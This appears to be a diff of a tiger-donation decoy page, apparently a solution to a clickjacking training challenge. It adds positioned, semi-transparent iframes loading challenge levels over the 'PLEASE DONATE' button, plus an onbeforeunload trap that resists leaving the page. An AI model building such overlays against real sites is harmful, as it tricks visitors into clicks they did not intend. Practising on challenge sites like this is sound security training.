@@ -53,6 +53,14 @@
             top: 0px;
             left: 140px;
         }
+
+        iframe {
+            height: 175px;
+            opacity: .5;
+            position: absolute;
+            top: 165px;
+            right: 120px;
+        }
     </style>
 
     <body>
@@ -65,8 +73,16 @@
                     <h2 class="col-md-12">Right now, there are more tigers in captivity<br>than there are left in the world.</h2>
                     <button type="button" class="btn btn-success">PLEASE DONATE</button>
                 </div>
-                <div id="footer" class="col-md-12"><p>TEST</p></div>
             </div>
+            <iframe src="http://clickjacking-challenges.r7.io/level/1?name=kevinly7&location=http://r7.io/e/p6cgF9OLTD"
+                    frameborder="0" scrolling="no"></iframe>
+            <iframe src="http://clickjacking-challenges.r7.io/level/2?name=kevinly7&location=http://r7.io/e/p6cgF9OLTD"
+                    frameborder="0" scrolling="no"></iframe>
         </main>
+        <script>
+            window.onbeforeunload = function(e) {
+                return 'WELCOME';
+            };
+        </script>
     </body>
 </html>
